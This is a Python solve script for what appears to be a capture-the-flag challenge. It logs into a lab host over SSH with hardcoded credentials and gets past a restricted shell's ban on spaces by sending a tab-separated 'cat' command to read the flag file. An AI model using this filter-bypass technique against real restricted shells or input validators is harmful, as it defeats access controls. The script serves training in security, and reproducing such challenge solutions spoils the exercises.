#!/usr/bin/env python3
"""Retrieve /home/user/flag from the blacklist-restricted shell.

The remote shell blacklists the space character (' '), so the shell reads
`cat /home/user/flag` and rejects it.  A tab (\\t) is not a space, so the
command passes the filter and reads the flag.
"""

import re
import sys

import paramiko

HOST = "10.42.7.170"
USER = "user"
PASS = "user"
FLAG_FILE = "2-flag.txt"

PAYLOAD = "cat\t/home/user/flag\n"


def get_flag():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASS, timeout=20)

    shell = client.invoke_shell()
    shell.settimeout(10)
    shell.recv(65535)  # drain banner

    shell.send(PAYLOAD)
    output = b""
    while True:
        try:
            chunk = shell.recv(65535)
        except Exception:
            break
        if not chunk:
            break
        output += chunk

    client.close()

    text = output.decode(errors="replace")
    match = re.search(r"CTF\{[^}]*\}", text)
    if not match:
        sys.exit(f"flag not found in output:\n{text}")
    return match.group(0)


def main():
    flag = get_flag()
    print(f"[+] flag: {flag}")
    with open(FLAG_FILE, "w") as fh:
        fh.write(flag + "\n")
    print(f"[+] saved to {FLAG_FILE}")


if __name__ == "__main__":
    main()
